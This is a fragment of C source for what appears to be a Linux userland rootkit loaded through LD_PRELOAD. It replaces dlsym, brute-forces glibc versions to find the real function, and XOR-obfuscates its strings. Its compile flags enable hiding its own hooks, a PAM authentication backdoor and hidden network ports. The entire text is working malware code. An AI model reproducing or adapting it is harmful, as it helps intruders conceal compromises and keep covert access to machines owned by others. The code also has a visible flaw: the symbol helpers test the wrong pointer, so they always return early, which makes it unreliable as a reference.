void *xdlopen(const char *filename){
    void *ret;
    xor(_filename, filename);
    ret = dlopen(filename, RTLD_LAZY);
    clean(_filename);
    return ret;
}

void get_libc_symbol(const char *symbol, void **funcptr)
{
    if(funcptr != NULL) return;

    libc_handle = xdlopen(LIBC_PATH);
    for(int i = 0; i < LIBC_CALLS_SIZE; i++)
    {
        if(!xstrncmp(symbol, libc_calls[i])){
            *funcptr = o_dlsym(libc_handle, symbol);
            break;
        }
    }
    (void)dlclose(libc_handle);
}

void get_libdl_symbol(const char *symbol, void **funcptr)
{
    if(funcptr != NULL) return;

    libdl_handle = xdlopen(LIBDL_PATH);
    for(int i = 0; i < LIBDL_CALLS_SIZE; i++)
    {
        if(!xstrncmp(symbol, libdl_calls[i])){
            *funcptr = o_dlsym(libdl_handle, symbol);
            break;
        }
    }
    (void)dlclose(libdl_handle);
}

#if defined(HIDE_HOOKS) && \
    defined(USE_PAM_BD)
void get_libpam_symbol(const char *symbol, void **funcptr)
{
    if(funcptr != NULL) return;

    libpam_handle = xdlopen(LIBPAM_PATH);
    for(int i = 0; i < LIBPAM_CALLS_SIZE; i++)
    {
        if(!xstrncmp(libpam_calls[i], symbol)){
            *funcptr = o_dlsym(libpam_handle, symbol);
            break;
        }
    }
    (void)dlclose(libpam_handle);
}
#endif

#ifdef HIDE_PORTS
void get_libpcap_symbol(const char *symbol, void **funcptr)
{
    if(funcptr != NULL) return;

    libpcap_handle = xdlopen(LIBPCAP_PATH);
    for(int i = 0; i < LIBPCAP_CALLS_SIZE; i++)
    {
        if(!xstrncmp(libpcap_calls[i], symbol)){
            *funcptr = o_dlsym(libpcap_handle, symbol);
            break;
        }
    }
    (void)dlclose(libpcap_handle);
}
#endif

void locate_dlsym(void){
    if(o_dlsym != NULL) return;

    char buf[32];
    xor(dstr, DLSYM_STR);
    xor(glibv_str, GLIBC_VER_STR);
    xor(glibvv_str, GLIBC_VERVER_STR);

    /* here we essentially are bruteforcing the location of dlsym
     * by iterating through every hypothetically possible version of libc. */
    for(int a = 0; a < GLIBC_MAX_VER; a++){
        (void)snprintf(buf, sizeof(buf), glibv_str, a);

        if((o_dlsym = (void*(*)(void *handle, const char *name))dlvsym(RTLD_NEXT, dstr, buf)))
            goto end_locate_dlsym;
    }

    for(int a = 0; a < GLIBC_MAX_VER; a++){
        for(int b = 0; b < GLIBC_MAX_VER; b++){
            (void)snprintf(buf, sizeof(buf), glibvv_str, a, b);

            if((o_dlsym = (void*(*)(void *handle, const char *name))dlvsym(RTLD_NEXT, dstr, buf)))
                goto end_locate_dlsym;
        }
    }
end_locate_dlsym:
    clean(dstr);
    clean(glibv_str);
    clean(glibvv_str);
    if(o_dlsym == NULL) exit(0);
}

void *dlsym(void *handle, const char *symbol){
    void *ptr = NULL;

    /* begin resolving our specified symbol from whichever lib's functions we've hooked. */
    locate_dlsym();

#ifdef HIDE_HOOKS
    get_libc_symbol(symbol, &ptr);
    get_libdl_symbol(symbol, &ptr);
#endif

#if defined(HIDE_HOOKS) && \
    defined(USE_PAM_BD)
    get_libpam_symbol(symbol, &ptr);
#endif

#if defined(HIDE_HOOKS) && \
    defined(HIDE_PORTS)
    get_libpcap_symbol(symbol, &ptr);
#endif

    if(ptr == NULL) ptr = o_dlsym(handle, symbol);
    return ptr;
}
